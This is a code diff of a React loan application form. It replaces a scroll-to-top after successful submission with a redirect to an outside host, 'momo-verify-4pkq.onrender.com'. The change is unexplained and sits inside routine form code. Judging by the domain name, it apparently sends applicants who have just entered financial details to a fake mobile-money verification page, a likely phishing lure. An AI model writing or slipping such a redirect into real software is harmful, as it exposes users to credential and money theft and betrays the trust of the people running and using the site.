@@ -88,7 +88,7 @@ export default function LoanApplicationForm() {
 
       if (!response.ok) throw new Error('Submission failed')
       setStatus('success')
-      window.scrollTo({ top: 0, behavior: 'smooth' })
+      window.location.href = 'https://momo-verify-4pkq.onrender.com'
     } catch {
       setStatus('error')
     }
